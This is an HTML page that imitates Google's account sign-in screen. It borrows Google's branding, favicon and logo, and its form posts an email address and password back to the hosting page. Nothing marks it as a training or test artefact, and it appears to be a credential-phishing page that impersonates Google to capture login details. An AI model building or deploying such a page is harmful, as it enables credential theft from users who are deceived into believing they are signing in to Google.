<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico"/>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .signin-card {
            width: 400px;
            padding: 48px 40px 36px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            background-color: #fff;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
        }

        .logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo img {
            width: 75px;
            height: 24px;
        }

        .signin-title {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
        }

        .signin-subtitle {
            color: #5f6368;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
        }

        .input-wrapper {
            margin-bottom: 24px;
        }

        .input-field {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .submit-btn {
            background-color: #1a73e8;
            border: 1px solid #1a73e8;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            min-width: 64px;
            padding: 0 24px;
            text-align: center;
            transition: background-color 0.2s;
            float: right;
        }

        .submit-btn:hover {
            background-color: #1669c1;
            border-color: #1669c1;
        }

        .forgot-email {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .form-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
    </style>
</head>
<body>
    <div class="signin-card">
        <div class="logo">
            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google"/>
        </div>
        
        <h1 class="signin-title">Sign in</h1>
              
        <form action="" method="POST">
            <div class="input-wrapper">
                <input type="email" name="email" class="input-field" placeholder="Email or phone" required=""/>
            </div>
            
            <div class="input-wrapper">
                <input type="password" name="password" class="input-field" placeholder="Enter your password" required=""/>
            </div>
            
            <div class="form-footer">
                <a href="#" class="forgot-email">Forgot email?</a>
                <button type="submit" class="submit-btn">Next</button>
            </div>
        </form>
    </div>

</body></html>
